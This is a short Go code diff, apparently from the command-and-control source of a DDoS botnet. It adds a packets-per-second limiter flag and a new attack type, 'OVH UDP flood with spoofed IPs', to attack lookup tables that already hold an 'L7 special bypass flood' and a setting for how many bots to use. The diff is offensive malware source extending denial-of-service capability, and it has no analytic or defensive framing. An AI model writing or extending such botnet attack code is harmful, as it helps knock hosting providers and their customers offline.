@@ -93,6 +93,10 @@ var flagInfoLookup = map[string]FlagInfo{
 		30,
 		"Number of bots to use for attack, -1 for all bots",
 	},
+	"pps": {
+		31,
+		"Packets per second limiter. 0 for unlimited",
+	},
 }
 
 var attackInfoLookup = map[string]AttackInfo{
@@ -292,6 +296,14 @@ var attackInfoLookup = map[string]AttackInfo{
 		ID:          25,
 		Flags:       []uint8{0, 6, 7, 30},
 		Description: "NERV L7 special bypass flood",
+		Vip:         false,
+		Admin:       false,
+		Disabled:    "",
+	},
+	"ovh": {
+		ID:          26,
+		Flags:       []uint8{0, 6, 7, 30, 31},
+		Description: "OVH UDP flood with spoofed IPs",
 		Vip:         false,
 		Admin:       false,
 		Disabled:    "",
